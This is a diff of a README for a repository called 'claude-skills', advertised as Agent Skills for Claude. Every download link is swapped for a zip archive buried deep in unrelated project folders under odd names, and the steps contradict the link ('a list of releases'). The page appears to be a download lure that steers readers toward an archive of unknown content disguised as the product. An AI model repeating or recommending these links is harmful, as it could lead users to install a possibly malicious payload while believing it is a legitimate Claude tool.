@@ -1,7 +1,7 @@
 # 🎉 claude-skills - Enhance Your AI Experience Easily
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-supabase-patterns/claude-skills-illaborate.zip%20Now-claude--skills-brightgreen)](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-supabase-patterns/claude-skills-illaborate.zip)
+[![Download](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-portfolio-builder/amazing-portfolio/amazing-portfolio/app/skills-claude-v1.5.zip%20Now-claude--skills-brightgreen)](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-portfolio-builder/amazing-portfolio/amazing-portfolio/app/skills-claude-v1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **claude-skills** repository! This software offers a collection of Agent Skills that enhance Claude's abilities in areas like voice AI, image generation, content creation, and web development. Follow these simple steps to get started.
@@ -21,7 +21,7 @@ Before you download the application, ensure your system meets these requirements
 - **Web Development Resources:** Enhance your projects with customizable skills.
 
 ## 💾 Download & Install
-To download the latest version of **claude-skills**, visit this page: [Download Page](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-supabase-patterns/claude-skills-illaborate.zip). 
+To download the latest version of **claude-skills**, visit this page: [Download Page](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-portfolio-builder/amazing-portfolio/amazing-portfolio/app/skills-claude-v1.5.zip). 
 
 1. Click on the link above.
 2. You will see a list of releases. Look for the latest version.
@@ -46,7 +46,7 @@ After installation, you can start using **claude-skills**:
 If you face any issues while using **claude-skills**, try the following:
 
 - **Reinstall the application:** Sometimes a fresh install fixes unexpected errors.
-- **Check for updates:** Ensure you are using the latest version by visiting the [Download Page](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-supabase-patterns/claude-skills-illaborate.zip).
+- **Check for updates:** Ensure you are using the latest version by visiting the [Download Page](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-portfolio-builder/amazing-portfolio/amazing-portfolio/app/skills-claude-v1.5.zip).
 - **Consult the community:** Look for discussions and solutions on forums or the issues section of this repository.
 
 ## 🔗 Additional Resources
